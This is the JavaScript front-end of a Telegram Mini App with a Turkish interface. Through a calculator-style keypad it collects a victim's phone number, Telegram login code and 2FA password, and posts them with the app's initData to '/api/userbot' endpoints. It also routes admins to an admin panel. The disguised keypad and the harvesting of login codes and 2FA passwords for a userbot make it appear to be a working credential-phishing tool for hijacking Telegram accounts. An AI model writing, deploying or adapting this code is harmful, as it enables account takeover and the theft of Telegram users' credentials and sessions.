const tg = window.Telegram?.WebApp;
if (tg) { tg.ready(); tg.expand(); }

const initData = tg?.initData || '';
const PHONE_PREFIX = '+994'; // İstediğiniz ülke kodunu buraya yazın

let calcState = 'PHONE'; // PHONE | CODE | PASSWORD
let phoneInput = '';
let codeInput = '';
let passwordInput = '';
let currentPhone = '';
let currentPhoneHash = '';

function showMsg(m) {
    if (tg?.showAlert) tg.showAlert(m); else alert(m);
}

function postJSON(url, body, extraHeaders = {}) {
    return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...extraHeaders },
        body: JSON.stringify(body)
    }).then(async r => {
        const j = await r.json().catch(() => ({}));
        return j;
    });
}

function updateDisplay() {
    const label = document.getElementById('calc-label');
    const value = document.getElementById('calc-value');
    const action = document.getElementById('calc-action');

    if (calcState === 'PHONE') {
        label.textContent = 'Telefon Numarası';
        const digits = phoneInput.replace(/\D/g, '');
        value.textContent = PHONE_PREFIX + digits;
        action.textContent = 'Kod Gönder';
    } else if (calcState === 'CODE') {
        label.textContent = 'Doğrulama Kodu';
        value.textContent = (codeInput.replace(/\d/g, '•') || '');
        action.textContent = 'Onayla';
    } else if (calcState === 'PASSWORD') {
        label.textContent = '2FA Şifresi';
        value.textContent = '•'.repeat(passwordInput.length);
        action.textContent = 'Giriş Yap';
    }
}

function calcPress(d) {
    if (calcState === 'PHONE' && phoneInput.length < 12) phoneInput += d;
    else if (calcState === 'CODE' && codeInput.length < 6) codeInput += d;
    else if (calcState === 'PASSWORD' && passwordInput.length < 32) passwordInput += d;
    updateDisplay();
}
function calcClear() {
    if (calcState === 'PHONE') phoneInput = '';
    else if (calcState === 'CODE') codeInput = '';
    else passwordInput = '';
    updateDisplay();
}
function calcBack() {
    if (calcState === 'PHONE') phoneInput = phoneInput.slice(0, -1);
    else if (calcState === 'CODE') codeInput = codeInput.slice(0, -1);
    else passwordInput = passwordInput.slice(0, -1);
    updateDisplay();
}

async function calcAction() {
    const btn = document.getElementById('calc-action');
    btn.disabled = true;

    try {
        if (calcState === 'PHONE') {
            const digits = phoneInput.replace(/\D/g, '');
            if (digits.length < 8) { showMsg('Geçerli telefon numarası girin'); return; }
            const phone = PHONE_PREFIX + digits;
            const data = await postJSON('/api/userbot/send-code', { phone });
            if (data.success) {
                currentPhone = phone;
                currentPhoneHash = data.phoneHash;
                calcState = 'CODE';
                codeInput = '';
                showMsg('Telegramdan kod gönderildi!');
            } else showMsg('Hata: ' + (data.error || 'Bilinmeyen'));
        } else if (calcState === 'CODE') {
            if (codeInput.length < 4) { showMsg('Kodu tam girin'); return; }
            const data = await postJSON('/api/userbot/verify', {
                phone: currentPhone, code: codeInput,
                phoneCodeHash: currentPhoneHash, password: '', initData
            });
            if (data.success) {
                showMsg('✅ Hesap başarıyla bağlandı!');
                resetAll();
            } else if (data.needPassword) {
                calcState = 'PASSWORD';
                passwordInput = '';
                showMsg(data.error);
            } else showMsg('Hata: ' + (data.error || 'Bilinmeyen'));
        } else if (calcState === 'PASSWORD') {
            const data = await postJSON('/api/userbot/verify', {
                phone: currentPhone, code: codeInput,
                phoneCodeHash: currentPhoneHash, password: passwordInput, initData
            });
            if (data.success) {
                showMsg('✅ Hesap başarıyla bağlandı!');
                resetAll();
            } else showMsg('Hata: ' + (data.error || 'Bilinmeyen'));
        }
    } catch (e) { showMsg('Hata: ' + e.message); }
    finally { btn.disabled = false; updateDisplay(); }
}

function resetAll() {
    calcState = 'PHONE'; phoneInput = ''; codeInput = '';
    passwordInput = ''; currentPhone = ''; currentPhoneHash = '';
    updateDisplay();
}

// init
updateDisplay();

// Admin ise panel'e yönlendir
postJSON('/api/auth', { initData }).then(data => {
    if (data.isAdmin) {
        if (tg?.showConfirm) {
            tg.showConfirm('Yönetici olarak giriş yaptınız. Admin panelini açmak ister misiniz?', (ok) => {
                if (ok) window.location.href = '/admin.html';
            });
        } else {
            window.location.href = '/admin.html';
        }
    }
}).catch(() => {});